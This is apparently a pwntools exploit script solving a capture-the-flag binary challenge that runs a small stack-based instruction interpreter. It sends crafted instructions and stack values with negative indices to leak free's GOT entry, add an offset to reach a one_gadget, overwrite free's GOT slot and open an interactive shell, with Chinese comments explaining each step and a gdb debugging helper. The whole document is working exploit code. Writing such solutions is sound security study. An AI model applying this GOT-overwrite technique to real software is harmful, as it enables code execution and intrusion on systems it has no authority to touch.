#coding=utf-8
from pwn import *
local = 1
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6") 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    set $data = 0x4056a0
    set $stack = 0x405040
    set $text = 0x405270 
    b *0x000000000401318
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def init():
    a.sendlineafter("Your program name:\n","aaa")
#debug()
init()

payload = "push push save push load push add push save"

a.sendlineafter("Your instruction:\n",payload)

one = -(0x844f0-0xf1147)
data_addr=0x000000000404088
data = [data_addr,-3,-13 ,one ,-13]

# data , -3 修改 data_addr
# -13 读取 free的地址
# add one ，得到 onegadget地址
# save 在free_got写入one_gadget
payload=""
for i in data:
    payload+=str(i)+" "

a.sendlineafter("Your stack data:\n",payload)


a.interactive()








